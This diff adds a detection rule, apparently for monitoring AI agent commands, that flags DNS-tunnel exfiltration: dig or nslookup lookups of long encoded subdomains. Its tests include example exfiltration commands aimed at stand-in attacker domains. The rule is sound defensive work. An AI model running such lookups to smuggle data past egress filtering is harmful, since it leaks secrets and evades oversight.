@@ -1,0 +1,52 @@
+id: dns-tunnel-exfiltration
+version: 1
+title: DNS lookup of a long encoded subdomain (DNS tunnel exfil)
+description: >
+  A DNS resolution command (dig / nslookup / host) is run against a hostname whose
+  leading label is an abnormally long alphanumeric/hex string — the canonical shape
+  of DNS-tunnel data exfiltration, where stolen bytes are hex/base32-encoded into a
+  subdomain and leaked via a recursive resolver even when direct HTTP egress is
+  blocked. Derived from the blastradius egress reachability surface
+  (src/probes/egress.rs), which notes DNS resolution succeeds independently of
+  filtered HTTP egress.
+severity: high
+status: stable
+posture: detect
+taxonomy:
+  owasp_llm: LLM06
+  mitre_atlas: AML.T0024
+
+match: >
+  e.event.action == "command.executed" &&
+  e.command.command.matches("(?i)\\b(dig|nslookup|host|drill)\\b") &&
+  e.command.command.matches("(?i)\\b[a-z0-9]{30,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b")
+
+emit:
+  reason: "DNS lookup of an abnormally long encoded subdomain label (DNS tunnel exfiltration)"
+
+tests:
+  - name: dig_long_hex_label
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "dig 4f8a9b2c1d3e5f6a7b8c9d0e1f2a3b4c5d6e7f80.exfil.example.com" }
+        session: { id: s1 }
+  - name: nslookup_long_label
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "nslookup deadbeefcafebabe0123456789abcdef0123456789.tunnel.attacker.net" }
+        session: { id: s1 }
+  - name: benign_dig
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "dig +short api.github.com" }
+        session: { id: s1 }
+  - name: benign_nslookup
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "nslookup registry.npmjs.org" }
+        session: { id: s1 }
+
